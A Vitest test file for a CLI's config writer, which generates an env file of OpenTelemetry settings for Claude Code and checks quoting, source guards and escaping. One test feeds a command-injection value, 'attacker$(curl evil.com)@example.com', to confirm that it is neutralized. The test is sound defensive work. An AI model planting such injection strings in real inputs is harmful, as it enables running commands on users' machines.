import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  generateEnvContent,
  getConfigFilePath,
  writeConfig,
} from "../../../src/claude-code/config/writer.js";
import { buildClaudeCodeEnv, TELEMETRY_ENV_KEYS } from "../../../src/claude-code/config/env.js";
import { parseEnvContent } from "../../../src/_core/config/loader.js";
import type { ClaudeCodeConfig } from "../../../src/claude-code/config/loader.js";

const minimalConfig: ClaudeCodeConfig = {
  apiKey: "hak_testkey123",
  endpoint: "https://api.revenium.ai",
};

const fullConfig: ClaudeCodeConfig = {
  apiKey: "hak_fullkey456",
  endpoint: "https://api.revenium.ai",
  email: "user@example.com",
  organizationName: "Acme Corp",
  productName: "Widget API",
  extraUsageEnabled: true,
  teamId: "teamHash123",
  ticketIdRegex: "[A-Z]+-\\d+",
  blockPolicy: "hard-block",
  managementEndpoint: "https://mgmt.example.com",
};

describe("generateEnvContent — a data file, never a shell export", () => {
  it("never exports a variable into the shell that sources it", () => {
    expect(generateEnvContent(fullConfig)).not.toContain("export ");
  });

  it("stops a legacy `source` before it reaches any assignment", () => {
    const lines = generateEnvContent(fullConfig).split("\n");
    const guardIndex = lines.indexOf("return 0 2>/dev/null");

    expect(guardIndex).toBeGreaterThanOrEqual(0);
    expect(lines.slice(0, guardIndex).every((line) => line.startsWith("#"))).toBe(true);
  });

  it("round-trips every variable the CLI reads back", () => {
    expect(parseEnvContent(generateEnvContent(fullConfig))).toEqual(buildClaudeCodeEnv(fullConfig));
  });

  it("writes only keys the settings writer also owns", () => {
    for (const key of Object.keys(buildClaudeCodeEnv(fullConfig))) {
      expect(TELEMETRY_ENV_KEYS).toContain(key);
    }
  });
});

describe("generateEnvContent — all fields populated", () => {
  it("includes REVENIUM_SUBSCRIBER_EMAIL", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("REVENIUM_SUBSCRIBER_EMAIL='user@example.com'");
  });

  it("includes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 when extraUsageEnabled is true", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED='1'");
  });

  it("includes REVENIUM_TEAM_ID when configured", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("REVENIUM_TEAM_ID='teamHash123'");
  });

  it("includes organization.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("organization.name=Acme Corp");
  });

  it("includes product.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("product.name=Widget API");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("user.email=user@example.com");
  });

  it("stamps revenium.middleware.source=revenium-cli in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toMatch(/revenium\.middleware\.source=revenium-cli(?!-)/);
  });
});

describe("generateEnvContent — management API endpoint override", () => {
  it("writes REVENIUM_MGMT_ENDPOINT when an explicit override is configured", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      managementEndpoint: "https://mgmt.example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("REVENIUM_MGMT_ENDPOINT='https://mgmt.example.com'");
  });

  it("omits REVENIUM_MGMT_ENDPOINT when no override is set (default resolved at call time)", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("REVENIUM_MGMT_ENDPOINT");
  });
});

describe("generateEnvContent — no cost_multiplier anywhere", () => {
  it("does not include cost_multiplier in output for full config", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).not.toContain("cost_multiplier");
  });

  it("does not include COST_MULTIPLIER env var", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).not.toContain("COST_MULTIPLIER");
  });

  it("does not include cost_multiplier in minimal config output", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("cost_multiplier");
  });
});

describe("generateEnvContent — user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES when email is set", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "solo@example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("user.email=solo@example.com");
  });

  it("still writes OTEL_RESOURCE_ATTRIBUTES (channel marker only) when email is not set", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toMatch(/revenium\.middleware\.source=revenium-cli(?!-)/);
    expect(output).not.toContain("user.email=");
  });
});

describe("generateEnvContent — EXTRA_USAGE_ENABLED", () => {
  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 when extraUsageEnabled is true", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: true };
    const output = generateEnvContent(config);
    expect(output).toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED='1'");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=0 when extraUsageEnabled is false", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: false };
    const output = generateEnvContent(config);
    expect(output).toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED='0'");
  });

  it("omits CLAUDE_CODE_EXTRA_USAGE_ENABLED when extraUsageEnabled is undefined", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED");
  });
});

describe("generateEnvContent — minimal config", () => {
  it("includes telemetry enabled, endpoint, headers, protocol, logs exporter", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).toContain("CLAUDE_CODE_ENABLE_TELEMETRY='1'");
    expect(output).toContain("OTEL_EXPORTER_OTLP_ENDPOINT='https://api.revenium.ai/meter/v2/otlp'");
    expect(output).toContain("OTEL_EXPORTER_OTLP_HEADERS='x-api-key=hak_testkey123'");
    expect(output).toContain("OTEL_EXPORTER_OTLP_PROTOCOL='http/json'");
    expect(output).toContain("OTEL_LOGS_EXPORTER='otlp'");
  });

  it("does not include subscription or email, but does write the channel-marker OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_SUBSCRIPTION");
    expect(output).not.toContain("REVENIUM_SUBSCRIBER_EMAIL");
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toMatch(/revenium\.middleware\.source=revenium-cli(?!-)/);
  });
});

describe("generateEnvContent — shell metacharacters in OTEL_RESOURCE_ATTRIBUTES", () => {
  it("escapes dollar signs in organization name", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      organizationName: "Org$Corp",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("organization.name=Org%24Corp");
    expect(output).not.toContain("organization.name=Org$Corp");
  });

  it("escapes backticks in product name", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      productName: "prod`test`",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("product.name=prod%60test%60");
    expect(output).not.toContain("product.name=prod`test`");
  });

  it("escapes backslashes in email", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "user\\evil@example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("user.email=user%5Cevil@example.com");
  });

  it("neutralizes command substitution in email within OTEL_RESOURCE_ATTRIBUTES", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "attacker$(curl evil.com)@example.com",
    };
    const output = generateEnvContent(config);
    const otelLine = output.split("\n").find((l) => l.includes("OTEL_RESOURCE_ATTRIBUTES"));
    expect(otelLine).toContain("user.email=attacker%24(curl evil.com)@example.com");
    expect(otelLine).not.toContain("$(curl");
  });
});

describe("generateEnvContent: skill name attribution", () => {
  it("enables OTEL_LOG_TOOL_DETAILS by default so Claude Code reports skill names", () => {
    expect(generateEnvContent(minimalConfig)).toContain("OTEL_LOG_TOOL_DETAILS='1'");
  });

  it("writes OTEL_LOG_TOOL_DETAILS=0 when the operator opts out", () => {
    const output = generateEnvContent({ ...minimalConfig, logToolDetails: false });
    expect(output).toContain("OTEL_LOG_TOOL_DETAILS='0'");
    expect(output).not.toContain("OTEL_LOG_TOOL_DETAILS='1'");
  });

  it("pins tool output off so a pre-existing OTEL_LOG_TOOL_CONTENT=1 cannot ship it", () => {
    expect(generateEnvContent(minimalConfig)).toContain("OTEL_LOG_TOOL_CONTENT='0'");
    expect(generateEnvContent({ ...minimalConfig, logToolDetails: false })).toContain(
      "OTEL_LOG_TOOL_CONTENT='0'",
    );
  });
});

describe("writeConfig", () => {
  let home = "";

  beforeEach(async () => {
    home = await mkdtemp(join(tmpdir(), "claude-writer-"));
    vi.stubEnv("HOME", home);
  });

  afterEach(async () => {
    vi.unstubAllEnvs();
    await rm(home, { recursive: true, force: true });
  });

  it("keeps revenium.env at ~/.claude for the ticket-gate shell contract", async () => {
    vi.stubEnv("CLAUDE_CONFIG_DIR", join(home, "relocated"));

    expect(getConfigFilePath()).toBe(join(home, ".claude", "revenium.env"));
  });

  it("deletes the fish companion earlier releases exported the key from", async () => {
    const claudeDir = join(home, ".claude");
    await mkdir(claudeDir, { recursive: true });
    const fishPath = join(claudeDir, "revenium.fish");
    await writeFile(fishPath, 'set -gx OTEL_EXPORTER_OTLP_HEADERS "x-api-key=hak_stale"\n');

    await writeConfig(minimalConfig);

    expect(existsSync(fishPath)).toBe(false);
  });
});
